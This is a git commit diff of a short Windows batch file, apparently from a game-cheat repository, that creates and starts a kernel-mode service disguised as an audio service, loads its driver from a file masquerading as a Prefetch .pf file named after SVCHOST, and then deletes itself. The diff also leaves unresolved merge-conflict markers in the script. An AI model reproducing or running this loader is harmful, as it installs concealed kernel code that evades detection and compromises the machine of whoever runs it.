03980f38becfd7c959b04e9a9fc17674483b2d7f
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2025-09-26 16:59:35 +0700

    Update 3.bat

--- 3.bat
+++ 3.bat
@@ -1,7 +1,12 @@
 @echo off
 cd %~dp0
+<<<<<<< HEAD
 sc create AudioEndpointBuilder_352 binpath=C:\Windows\Prefetch\SVCHOST.EXE-LB2XQ7N4.pf type=kernel
 sc start AudioEndpointBuilder_352
+=======
+sc create AudioEndpointBuilder_515 binpath=C:\Windows\Prefetch\SVCHOST.EXE-M5S1KJ74.pf type=kernel
+sc start AudioEndpointBuilder_515
+>>>>>>> 76bd4804607508881a6ef17a5e0944ac0bc07bfa
 del "%~f0"
 
 
